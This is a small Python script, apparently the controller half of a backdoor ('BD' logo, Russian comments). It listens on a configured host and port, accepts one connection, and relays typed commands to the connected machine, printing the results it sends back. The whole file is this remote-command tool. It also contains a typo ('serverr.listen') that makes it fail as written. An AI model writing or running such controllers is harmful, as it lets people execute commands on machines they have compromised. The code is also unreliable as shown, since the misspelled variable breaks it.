import socket
from config import *

def logo():
    logo = ['\n\n',
        '******      ********',
        '*******     *********',
        '**    **    **     **',
        '**    **    **     **      Written on Python',
        '*******     **     **',
        '********    **     **',
        '**     **   **     **      Author: C0D3RG0D',
        '**     **   **     **',
        '**     **   **     **',
        '********    *********',
        '*******     ********',
        '\n\n']

    for i in logo:
        print (i)

def main():
    
    logo()

    host = HOST # ip который будем прослушивать
    port = PORT # порт
  
    server = socket.socket() # создаем сокет
    server.bind((host,port))
  
    serverr.listen(1)
    print("Waiting for connection...")
    connection, address = server.accept() # подключаемся
    print("Connection from " + str(address))
    while True:
        try:
            toSend = input("--> ")
            connection.send(toSend.encode()) # отправляем команду
            data = connection.recv(1024).decode() # получаем результат
            print(data) # выводим на экран
        except:
            break
    print("Connection refused") # в случае, если соединение разорванно
    connection.close()
  
if __name__ == '__main__':
    main()